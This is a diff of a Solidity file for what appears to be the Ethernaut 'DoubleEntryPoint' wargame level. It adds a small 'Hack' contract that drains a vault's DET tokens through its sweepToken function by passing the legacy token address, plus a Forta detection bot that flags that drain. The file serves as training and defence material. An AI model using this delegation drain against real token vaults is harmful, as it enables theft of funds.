@@ -1,5 +1,3 @@
-
-
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.16;
 
@@ -11,17 +9,22 @@ import "@openzeppelin/contracts/access/Ownable.sol";
 
 
 /**
-This level features a CryptoVault with special functionality, 
-the sweepToken function. This is a common function to retrieve tokens stuck in a contract. 
-The CryptoVault operates with an underlying token that can't be swept, being it an important core's logic component of the CryptoVault, any other token can be swept.
+This level features a CryptoVault with special functionality, the sweepToken function. 
+This is a common function to retrieve tokens stuck in a contract. 
+The CryptoVault operates with an underlying token that can't be swept, 
+being it an important core's logic component of the CryptoVault, 
+any other token can be swept.
 
-The underlying token is an instance of the DET token implemented in DoubleEntryPoint contract definition and the CryptoVault holds 100 units of it. 
+The underlying token is an instance of the DET token implemented in DoubleEntryPoint contract definition 
+and the CryptoVault holds 100 units of it. 
 Additionally the CryptoVault also holds 100 of LegacyToken LGT.
 
 In this level you should figure out where the bug is in CryptoVault and protect it from being drained out of tokens.
 
 The contract features a Forta contract where any user can register its own detection bot contract. 
-Forta is a decentralized, community-based monitoring network to detect threats and anomalies on DeFi, NFT, governance, bridges and other Web3 systems as quickly as possible. 
+Forta is a decentralized, community-based monitoring network to detect threats and anomalies on DeFi, NFT, governance,
+bridges and other Web3 systems as quickly as possible. 
+
 Your job is to implement a detection bot and register it in the Forta contract.
  The bot's implementation will need to raise correct alerts to prevent potential attacks or bug exploits.
 
@@ -116,14 +119,17 @@ contract DoubleEntryPoint is ERC20("DoubleEntryPointToken", "DET"), DelegateERC2
     address public delegatedFrom;
     Forta public forta;
 
-    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) {
+    constructor(address legacyToken, address vaultAddress, address fortaAddress) {
         delegatedFrom = legacyToken;
         forta = Forta(fortaAddress);
-        player = playerAddress;
+        player = msg.sender;
         cryptoVault = vaultAddress;
         _mint(cryptoVault, 100 ether);
     }
 
+//0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8,100000000000000000000
+// 0xD7ACd2a9FD159E69Bb102A1ca21C9a3e3A5F771B,100000000000000000000
+//0xf8e81D47203A594245E36C48e151709F0C19fBe8,0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2,100000000000000000000
     modifier onlyDelegateFrom() {
         require(msg.sender == delegatedFrom, "Not legacy contract");
         _;
@@ -153,4 +159,53 @@ contract DoubleEntryPoint is ERC20("DoubleEntryPointToken", "DET"), DelegateERC2
         _transfer(origSender, to, value);
         return true;
     }
+}
+
+
+interface CryptoVaultI {
+    function sweepToken(address token) external;
+}
+
+interface DetI {
+    function balanceOf(address add) external view returns(uint);
+}
+//0xEf9f1ACE83dfbB8f559Da621f4aEA72C6EB10eBf,0x4a9C121080f6D9250Fc0143f41B595fD172E31bf,0x0498B7c793D7432Cd9dB27fb02fc9cfdBAfA1Fd3
+contract Hack {
+
+    CryptoVaultI vault;
+    DetI det;
+    address legacyToken;
+
+    constructor(address _vault, address _legacyToken, address _det){
+        vault = CryptoVaultI(_vault);
+        legacyToken = _legacyToken;
+        det = DetI(_det);
+    }
+
+    function getTokenBalance() public view returns(uint) {
+        return det.balanceOf(address(vault));
+    }
+
+    function hack() public {
+        vault.sweepToken(legacyToken);
+    }
+}
+
+contract HackPreventBot is IDetectionBot {
+  address public cryptoVaultAddress;
+
+  constructor(address _cryptoVaultAddress) {
+    cryptoVaultAddress = _cryptoVaultAddress;
+  }
+
+  function handleTransaction(address user, bytes calldata  msgData) external override { 
+    address origSender;
+    assembly {
+      origSender := calldataload(0xa8)
+    }
+
+    if (origSender == cryptoVaultAddress) {
+      Forta(msg.sender).raiseAlert(user);
+    }
+  }
 }
